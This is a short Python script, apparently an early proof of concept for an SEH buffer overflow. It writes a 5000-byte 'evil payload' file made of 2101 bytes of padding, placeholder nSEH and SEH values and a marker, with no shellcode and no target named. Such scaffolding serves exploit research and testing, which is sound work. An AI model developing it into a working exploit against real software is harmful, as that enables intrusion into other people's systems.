#!/usr/bin/python

nSEH = "B" * 4
SEH = "C" * 4

buffer  = "A" * 2101
buffer += nSEH
buffer += SEH
buffer += "\xEF\xBE\xAD\xDE"
buffer += "C" * (5000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

